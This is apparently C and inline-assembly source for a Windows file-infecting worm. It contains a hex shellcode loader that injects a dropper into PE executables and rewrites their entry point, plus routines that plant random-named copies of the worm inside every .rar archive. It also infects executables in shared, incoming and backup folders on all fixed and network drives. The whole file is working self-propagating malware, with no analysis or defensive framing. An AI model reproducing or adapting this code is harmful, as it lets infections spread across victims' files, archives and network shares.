   #include "stdafx.h"
   #include "prototypez.h"

   //module to infect all rar files on all drivers

   char wormpath[MAX_PATH];

   #define     OPEN_FILE_ERROR         0x15;
   #define     FILE_ALREADY_INFECTED   0x16;
   #define     FILE_CANOT_BE_INFECTED  0x17;
   #define     INFECTION_SUCCESS       0x10;


   int InfectPeFile(char FilePath[],char VirusFile[])
   {
       /*
           insert dropper code into the host,that drop the virus file
           as random 5 letters .exe file hidden file,and execute it

           warning: tested only under win98
       */

       unsigned char LoaderCode[315] =
       {
       0x60, 0x64, 0x67, 0xA1, 0x00, 0x00, 0x8B, 0x10, 0x42, 0x74, 0x04, 0x4A, 0x92, 0xEB, 0xF7, 0x8B,
       0x40, 0x04, 0x25, 0x00, 0x00, 0xFF, 0xFF, 0x66, 0x81, 0x38, 0x4D, 0x5A, 0x74, 0x07, 0x2D, 0x00,
       0x00, 0x01, 0x00, 0xEB, 0xF2, 0x8B, 0xE8, 0x03, 0x40, 0x3C, 0x8B, 0x40, 0x78, 0x03, 0xC5, 0x50,
       0x33, 0xD2, 0x8B, 0x40, 0x20, 0x03, 0xC5, 0x8B, 0x38, 0x03, 0xFD, 0x4F, 0x47, 0xE8, 0x0F, 0x00,
       0x00, 0x00, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73,
       0x00, 0x5E, 0xB9, 0x0E, 0x00, 0x00, 0x00, 0xF3, 0xA6, 0x74, 0x09, 0x42, 0x80, 0x3F, 0x00, 0x74,
       0xDB, 0x47, 0xEB, 0xF8, 0x58, 0xD1, 0xE2, 0x8B, 0x58, 0x24, 0x03, 0xDD, 0x03, 0xDA, 0x66, 0x8B,
       0x13, 0xC1, 0xE2, 0x02, 0x8B, 0x58, 0x1C, 0x03, 0xDD, 0x03, 0xDA, 0x8B, 0x1B, 0x03, 0xDD, 0xE8,
       0x0A, 0x00, 0x00, 0x00, 0x57, 0x72, 0x69, 0x74, 0x65, 0x46, 0x69, 0x6C, 0x65, 0x00, 0x55, 0xFF,
       0xD3, 0x50, 0xE8, 0x0C, 0x00, 0x00, 0x00, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x6C,
       0x65, 0x41, 0x00, 0x55, 0xFF, 0xD3, 0x50, 0xE8, 0x08, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6E, 0x45,
       0x78, 0x65, 0x63, 0x00, 0x55, 0xFF, 0xD3, 0x50, 0xE8, 0x0C, 0x00, 0x00, 0x00, 0x43, 0x6C, 0x6F,
       0x73, 0x65, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x00, 0x55, 0xFF, 0xD3, 0x50, 0x8B, 0x6C, 0x24,
       0x08, 0x33, 0xC0, 0x50, 0x6A, 0x02, 0x6A, 0x02, 0x50, 0x6A, 0x01, 0x68, 0x00, 0x00, 0x00, 0x40,
       0xE8, 0x0A, 0x00, 0x00, 0x00, 0x77, 0x69, 0x6E, 0x33, 0x32, 0x2E, 0x65, 0x78, 0x65, 0x00, 0xFF,
       0xD5, 0x83, 0xF8, 0xFF, 0x74, 0x3E, 0x89, 0x44, 0x24, 0x08, 0x8B, 0x6C, 0x24, 0x0C, 0x6A, 0x00,
       0x8B, 0xFC, 0x6A, 0x00, 0x57, 0x68, 0xE6, 0x00, 0x00, 0x00, 0x68, 0x00, 0x20, 0x40, 0x00, 0x50,
       0xFF, 0xD5, 0x58, 0x8B, 0x2C, 0x24, 0xFF, 0x74, 0x24, 0x08, 0xFF, 0xD5, 0x5D, 0x5D, 0x83, 0xC4,
       0x08, 0x6A, 0x01, 0xE8, 0x0A, 0x00, 0x00, 0x00, 0x77, 0x69, 0x6E, 0x33, 0x32, 0x2E, 0x65, 0x78,
       0x65, 0x00, 0xFF, 0xD5, 0x61, 0x68, 0x78, 0x56, 0x34, 0x12, 0xC3,
       } ;


       int ExitCode,LoaderSize=sizeof(LoaderCode),i;

       char filename[5];

       HANDLE hfile,hfilemap,hostmap;
       HANDLE hvir,hvirmap,virmap;

       DWORD FileSize,VirusSize,LoaderOffset,VirusOffset,FixRVA=0,xseed;

       hfile=CreateFile(FilePath,GENERIC_READ | GENERIC_WRITE,NULL,
           NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

       hvir=CreateFile(VirusFile,GENERIC_READ,FILE_SHARE_READ,
           NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

       if((hfile==INVALID_HANDLE_VALUE) | (hvir==INVALID_HANDLE_VALUE))
           return OPEN_FILE_ERROR;


       FileSize=GetFileSize(hfile,NULL);

       VirusSize=GetFileSize(hvir,NULL);

       if((FileSize==0xFFFFFFFF) | ((FileSize%101)==0) | (VirusSize==0xFFFFFFFF))
       {
           CloseHandle(hfile);
           CloseHandle(hvir);
           return FILE_ALREADY_INFECTED;
       }

       hfilemap=CreateFileMapping(hfile,NULL,PAGE_READWRITE,NULL,FileSize+VirusSize,NULL);

       if(hfilemap==NULL)
       {
           CloseHandle(hfile);
           CloseHandle(hvir);
           return OPEN_FILE_ERROR;
       }

       hostmap=MapViewOfFile(hfilemap,FILE_MAP_ALL_ACCESS,NULL,NULL,FileSize+VirusSize);

       if(hostmap==NULL)
       {
           CloseHandle(hfilemap);
           CloseHandle(hfile);
           CloseHandle(hvir);
           return OPEN_FILE_ERROR;
       }

       hvirmap=CreateFileMapping(hvir,NULL,PAGE_READONLY,NULL,NULL,NULL);

       if(hvirmap==NULL)
       {
           CloseHandle(hfilemap);
           CloseHandle(hfile);
           CloseHandle(hvir);
           return OPEN_FILE_ERROR;
       }

       virmap=MapViewOfFile(hvirmap,FILE_MAP_READ,NULL,NULL,NULL);

       if(virmap==NULL)
       {
           CloseHandle(hvirmap);
           CloseHandle(hfilemap);
           CloseHandle(hfile);
           CloseHandle(hvir);
           return OPEN_FILE_ERROR;
       }

       //generate random file name

       xseed=GetTickCount();

       for(i=0;i<sizeof(filename);i++,xseed<<=i)
           filename[i]=(char)(97+(xseed % 25));


       /*infection code start here !
       ------------------------------*/

       try {


       __asm
       {
           mov     eax,hostmap
           cmp     word ptr [eax],5a4dh                    ;check mz signature
           jne     InfectionError
           add     eax,[eax + 3ch]
           cmp     word ptr [eax],4550h                    ;check pe signature
           jne     InfectionError
           push    eax                                     ;save pointer to pe header
           xor     ecx,ecx
           mov     cx,[eax + 6h]                           ;get number of sections
           mov     ebx,[eax + 74h]                         ;get number of datadirectory
           shl     ebx,3h
           add     eax,ebx
           add     eax,78h                                 ;eax - first section header
   NS:     mov     ebx,[eax + 24h]                         ;get section flags
           and     ebx,20h
           cmp     ebx,20h
           je      CheckCS
           add     eax,28h                                 ;move to next section
           loop    NS
           pop     eax
           jmp     InfectionError
   CheckCS:mov     ebx,[eax + 10h]                         ;get size of raw data
           sub     ebx,[eax + 8h]                          ;sub from it the virtual size
           cmp     ebx,LoaderSize                          ;there is enough space for loader ?
           ja      SpaceOk
           pop     eax
           jmp     InfectionError
   SpaceOk:mov     ebx,[eax + 14h]                         ;get pointer to raw data
           cmp     ebx,[eax + 0ch]
           je      SetLO
           pop     eax
           jmp     InfectionError
   SetLO:  add     ebx,[eax + 8h]                          ;add the virtual size to it
           add     ebx,[hostmap]                           ;add the mapbase
           mov     [LoaderOffset],ebx
           push    dword ptr [eax + 10h]                   ;push size of raw data
           pop     dword ptr [eax + 8h]                    ;overwrite virtual size with it
           mov     eax,[esp]                               ;get pe header
           xor     ecx,ecx
           mov     cx,word ptr [eax + 6h]                  ;get number of sections
           dec     ecx
           mov     ebx,[eax + 74h]                         ;get number of datadirectory
           shl     ebx,3h
           add     eax,ebx
           add     eax,78h                                 ;eax - first section header
   LS:     add     eax,28h
           loop    LS
           mov     edi,[eax + 0ch]
           sub     edi,[eax + 14h]
           mov     [FixRVA],edi
           mov     edi,[eax + 14h]                         ;get pointer to raw data
           add     edi,[hostmap]                           ;convert it to va
           add     edi,[eax + 10h]                         ;goto end of section body
           mov     [VirusOffset],edi
           mov     esi,[virmap]
           mov     ecx,[VirusSize]
           rep     movsb                                   ;copy virus into host
           mov     ecx,[VirusSize]
           add     [eax + 8h],ecx                          ;update virtual size
           add     [eax + 10h],ecx                         ;update size of raw data
           ;set up loader & copy loader into host
           ;--------------------------------------
           ;+106h == VirusSize
           ;+10Bh == VirusOffset
           ;+136h == HostEntry
           ;--------------------------------------
           lea     esi,LoaderCode
           ;set file name
           ;--------------
           pushad
           push    esi
           xchg    edi,esi
           add     edi,0E5h
           lea     esi,filename
           mov     ecx,5h
           rep     movsb
           pop     edi
           add     edi,128h
           lea     esi,filename
           mov     ecx,5h
           rep     movsb
           popad
           push    [VirusSize]
           pop     dword ptr [esi + 106h]                  ;set virus size
           mov     eax,[esp]                               ;get pe header
           mov     ebx,[eax + 28h]
           add     ebx,[eax + 34h]
           mov     dword ptr [esi + 136h],ebx              ;set host entry point
           mov     ebx,[VirusOffset]
           sub     ebx,[hostmap]
           add     ebx,[eax + 34h]
           add     ebx,[FixRVA]
           mov     dword ptr [esi + 10bh],ebx              ;set virus offset
           mov     edi,[LoaderOffset]
           mov     ecx,[LoaderSize]
           rep     movsb                                   ;copy loader into host
           pop     eax                                     ;get pe header
           mov     ebx,[LoaderOffset]
           sub     ebx,[hostmap]
           mov     [eax + 28h],ebx                         ;set new entry point
           mov     ebx,[VirusSize]
           add     [eax + 50h],ebx                         ;update image size
           mov     ExitCode,INFECTION_SUCCESS
           jmp     ExtInfect
   InfectionError:
           mov     ExitCode,FILE_CANOT_BE_INFECTED
   ExtInfect:
           nop
       }

       }

       catch(...)
       {
           ExitCode=0x17;
       }

       if(ExitCode==0x17)
       {
           SetFilePointer(hfile,FileSize,NULL,FILE_BEGIN);
           SetEndOfFile(hfile);
           CloseHandle(hfile);
       }
       else
       {
           SetFilePointer(hfile,FileSize+VirusSize+(101-((FileSize+VirusSize)%101)),NULL,FILE_BEGIN);
           SetEndOfFile(hfile);
           CloseHandle(hfile);
       }


       UnmapViewOfFile(hostmap);
       UnmapViewOfFile(virmap);
       CloseHandle(hfilemap);
       CloseHandle(hvir);
       CloseHandle(hvirmap);


       return ExitCode;
   }



   void InfectDrive()
   {
       //variables
       WIN32_FIND_DATA wfd;
       HANDLE hfind;
       char fullpath[MAX_PATH];
       LPTSTR xaddr=NULL;
       char xrndstr[30];

       hfind=FindFirstFile("*.*",&wfd);

       if(hfind!=INVALID_HANDLE_VALUE)
       {
           do
           {
               if(wfd.cFileName[0]!='.')   //most not be .. or .
               {
                   wfd.dwFileAttributes&=FILE_ATTRIBUTE_DIRECTORY;
                   if(wfd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY) //is directory ?
                   {
                       if(SetCurrentDirectory(wfd.cFileName)==TRUE)
                       {
                           InfectDrive();
                           SetCurrentDirectory("..");  //return to upper directory
                       }
                   }
                   else
                   {
                       if(GetFullPathName(wfd.cFileName,MAX_PATH,fullpath,&xaddr)!=0)
                       {
                           CharLower(fullpath);

                           if(memcmp(fullpath+lstrlen(fullpath)-3,"rar",3)==0)
                           {
                               Sleep(5000);
                               RandomString(xrndstr,7,TRUE);
                               lstrcat(xrndstr,".exe");
                       //      OutputDebugString(fullpath);
                       //      OutputDebugString("\r\n");
                               AddToRar(fullpath,wormpath,xrndstr,FILE_ATTRIBUTE_NORMAL);
                           }
                           else if(memcmp(fullpath+lstrlen(fullpath)-3,"exe",3)==0)
                           {
                               CharLower(fullpath);

                               if(strstr(fullpath,"share")!=NULL)
                                   InfectPeFile(fullpath,wormpath);
                               else if(strstr(fullpath,"incoming")!=NULL)
                                   InfectPeFile(fullpath,wormpath);
                               else if(strstr(fullpath,"recived")!=NULL)
                                   InfectPeFile(fullpath,wormpath);
                               else if(strstr(fullpath,"backup")!=NULL)
                                   InfectPeFile(fullpath,wormpath);
                           }
                       }
                   }
               }
           }while(FindNextFile(hfind,&wfd));
           FindClose(hfind);
       }
   }

   DWORD WINAPI RarWorm(LPVOID xvoid)
   {
       char Drive[]="z:\\";
       UINT drive_type;

       if(GetModuleFileName(NULL,wormpath,MAX_PATH)==0)
           ExitThread(0);

       do
       {
           drive_type=GetDriveType(Drive);

           if(drive_type==DRIVE_FIXED || drive_type==DRIVE_REMOTE)
           {
               if(SetCurrentDirectory(Drive)==TRUE)
                   InfectDrive();
           }

           Drive[0]--;

       }while(Drive[0]!='b');

       return 1;
   }
